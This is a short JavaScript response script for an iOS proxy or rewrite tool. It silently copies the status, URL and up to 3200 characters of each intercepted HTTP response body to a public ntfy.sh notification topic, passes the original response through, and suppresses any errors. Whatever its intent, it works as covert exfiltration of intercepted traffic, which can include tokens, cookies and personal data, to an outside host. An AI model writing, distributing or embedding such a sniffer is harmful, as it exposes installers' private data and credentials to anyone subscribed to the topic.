var T = 'https://ntfy.sh/itc-zak-9f3a2';
var raw = ($response && $response.body);
if (raw === undefined || raw === null) { $done({}); }
else {
  var b = String(raw);
  var texty = (b.indexOf('<') >= 0 || b.indexOf('{') >= 0 || b.indexOf('[') >= 0);
  try {
    var u = String(($request && $request.url) || '');
    var s = String(($response && $response.status) || '');
    $httpClient.post({ url: T, body: 'RES ' + s + ' ' + u.slice(0, 220) + ' len=' + b.length + '\n' + b.replace(/[^\x20-\x7E]/g, ' ').slice(0, 3200), headers: { 'Title': 'res' } }, function () {});
  } catch (e) {}
  if (texty) { $done({ body: b }); } else { $done({}); }
}
